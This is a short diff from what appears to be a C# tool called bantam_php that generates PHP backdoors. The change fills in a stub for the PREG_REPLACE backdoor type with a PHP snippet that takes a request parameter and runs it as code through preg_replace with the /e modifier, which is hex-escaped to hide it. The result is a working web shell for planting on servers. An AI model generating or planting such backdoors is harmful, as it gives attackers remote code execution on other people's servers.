@@ -79,8 +79,7 @@ namespace bantam_php
 
                 case BackdoorTypes.PREG_REPLACE:
                     {
-                        //TODO
-                        backdoor = "todo";
+                        backdoor = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\tpreg_replace(\"/.*/\x65\", $_" + varType +"['" + varName + "'],'.');\r\n}";
                         break;
                     }
             }
